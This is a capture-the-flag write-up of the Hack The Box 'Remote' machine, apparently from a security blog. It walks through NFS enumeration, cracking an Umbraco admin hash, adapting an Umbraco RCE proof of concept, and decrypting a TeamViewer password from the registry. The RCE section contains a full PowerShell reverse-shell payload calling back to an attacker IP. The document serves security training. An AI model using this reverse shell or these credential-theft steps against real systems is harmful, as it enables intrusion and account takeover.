I">3<p><strong><center>Ref°: HTB-15-Machine</center></strong></p>

<p>— Remote is a vulnerable machine through a misconfigured NFS share, a CMS with a vulnerability in its version that allows to get a foothold on the host.</p>

<p>Once on the target machine, a privilege escalation is possible through a vulnerability in our version of Teamviewer with exploitation of regedit.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Information-Remote.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
<h3 id="network-service-scanning">Network Service Scanning</h3>
<hr />

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-nmap.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="file-transfert-protocol">File Transfert Protocol</h3>
<hr />
<p>Anonymous FTP login allowed. Nothing to exploit here.</p>

<h3 id="website-and-cms-umbraco">Website and CMS Umbraco</h3>
<hr />
<p>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-website.png” | relative_url }})</p>

<p>wfuzz tool reveal <code class="language-plaintext highlighter-rouge">install</code> and <code class="language-plaintext highlighter-rouge">umbraco</code> path behind the URL. 
<code class="language-plaintext highlighter-rouge">install</code> path response status code 302 and redirect on <code class="language-plaintext highlighter-rouge">umbraco</code>. This one response status code 200, we can check it directly.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">--hc</span> 404,403 http://10.10.10.180/FUZZ
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-wfuzz.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>Or we can get hint from source-page :</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-source_page.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>Umbraco is an open-source content management system (CMS) platform for publishing content on the World Wide Web and intranets. 
It is written in C# and deployed on Microsoft based infrastructure.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-login_page.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>This CMS seem to be exploitable from different vulnerabilities :</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-searchsploit.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-metasploit.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="network-file-system">Network File System</h3>
<hr />
<p>The <code class="language-plaintext highlighter-rouge">/site_backups</code> directory is mountable for everyone.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>showmount <span class="nt">-e</span> 10.10.10.180
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-showmount.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>We can exploit a weakly configured NFS share to gain access to remote host followed by enumeration.</p>

<p>References - exploiting nfs share : <a href="https://resources.infosecinstitute.com/exploiting-nfs-share/#gref">https://resources.infosecinstitute.com/exploiting-nfs-share/#gref</a></p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">mkdir </span>site_backups
<span class="gp">$</span><span class="w"> </span>mount <span class="nt">-t</span> nfs 10.10.10.180:site_backups site_backups
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-mount.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
<h3 id="hashed-password-from-logfiles">Hashed Password from logfiles</h3>
<hr />
<p>We find many others files and folders.</p>

<p>With a little ‘grep’ command in the NFS share, we search all string value in reference with “admin” “administrator” “password”.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="nt">-i</span> <span class="s2">"admin|administrator|password"</span> <span class="k">*</span>
</code></pre></div></div>
<p>We find intereting files <code class="language-plaintext highlighter-rouge">App_Data/Logs/*</code> and <code class="language-plaintext highlighter-rouge">App_Data/Umbraco.sdf</code></p>

<p>We find <code class="language-plaintext highlighter-rouge">admin@htb.local</code> and <code class="language-plaintext highlighter-rouge">ssmith@htb.local</code> users in logs files:</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-log_files.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>We find hash value password of our users in the header of Umbraco.sdf file:</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">head </span>Umbraco.sdf
</code></pre></div></div>
<p>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-sdf_file.png” | relative_url }})</p>

<ul>
  <li>
    <p>admin@htb.local : <code class="language-plaintext highlighter-rouge">b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}</code></p>
  </li>
  <li>
    <p>smith@htb.local : <code class="language-plaintext highlighter-rouge">jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}</code></p>
  </li>
</ul>

<h3 id="decrypting-password">Decrypting Password</h3>
<hr />
<p>References - Decrypt SHA1 hash : <a href="https://md5decrypt.net/Sha1/">https://md5decrypt.net/Sha1/</a></p>

<ul>
  <li>Password decrypt : <code class="language-plaintext highlighter-rouge">baconandcheese</code></li>
</ul>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-decrypt_sha1.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="obtaining-reverse-shell-with-rce-execution">Obtaining Reverse Shell with RCE Execution</h3>
<hr />
<p>References - RCE umbraco :</p>
<ul>
  <li><a href="https://www.exploit-db.com/exploits/46153">https://www.exploit-db.com/exploits/46153</a></li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
</ul>

<p>The script is a PoC, so we need to modify according to our environment.</p>

<p>In the payload part add our reverse shell command in powershell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ string cmd = "$client = New-Object System.Net.Sockets.TCPClient(\'10.10.14.67\',4445);\
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); \
$sendback=(iex $data | Out-String); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'&gt; \'; \
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);\
$stream.Flush();};$client.Close()"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt;\
&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; ';
</code></pre></div></div>

<ul>
  <li>proc.StartInfo.FileName = “powershell.exe”</li>
</ul>

<p>In the config part:</p>

<ul>
  <li>login = “admin@htb.local”</li>
  <li>password = “baconandcheese”</li>
  <li>host = “http://10.10.10.180”</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-payload.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>We listen 4445 port and get reverse shell under iis service.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-rev_shell.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="flag-user">Flag user</h3>
<hr />

<p>And we flag the <code class="language-plaintext highlighter-rouge">Public user</code>.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-flag_user.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="3-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[3] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
<h3 id="teamviewer-7-exploitation">Teamviewer 7 Exploitation</h3>
<hr />

<p>With the name of the machine we have a big hint to search way to escalate privilege and compromise the host : <code class="language-plaintext highlighter-rouge">Remote = TeamViewer</code></p>

<p>TeamViewer stored admin password encrypted with AES-128-CBC with they key of <code class="language-plaintext highlighter-rouge">0602000000a400005253413100040000</code> and iv of <code class="language-plaintext highlighter-rouge">0100010067244F436E6762F25EA8D704</code> in the Windows registry. 
We only need recover the value of the <code class="language-plaintext highlighter-rouge">SecurityPasswordAES</code> in regedit to decrypt this with key and iv parameters.</p>

<p>References - exploit method :</p>
<ul>
  <li><a href="https://whynotsecurity.com/blog/teamviewer/">https://whynotsecurity.com/blog/teamviewer/</a></li>
  <li><a href="https://github.com/n0fate/chainbreaker/issues/10">https://github.com/n0fate/chainbreaker/issues/10</a></li>
</ul>

<h3 id="encrypted-password-from-registry">Encrypted Password from Registry</h3>
<hr />

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">reg query HKLM /f teamviewer /t REG_SZ /s
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7\
</span></code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-regedit.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="decrypting-password-1">Decrypting Password</h3>
<hr />
<p>We can decrypt this password using with script python :</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-script.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>And get administrator password : <code class="language-plaintext highlighter-rouge">!R3m0te!</code></p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-decrypt_password.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="remote-service-winrm-login-and-flag-root">Remote Service WinRM login and Flag root</h3>
<hr />
<p>Reference - evil-winrm : <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/remote/HTB-Images-Remote-flag_root.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="trophy"><strong><center>Trophy</center></strong></h2>

<blockquote>
  <p><strong>It doesn’t matter how many times you get knocked down. All that matters is you get up one more time than you were knocked down.</strong></p>

  <p>Roy T. Bennett</p>
</blockquote>
:ET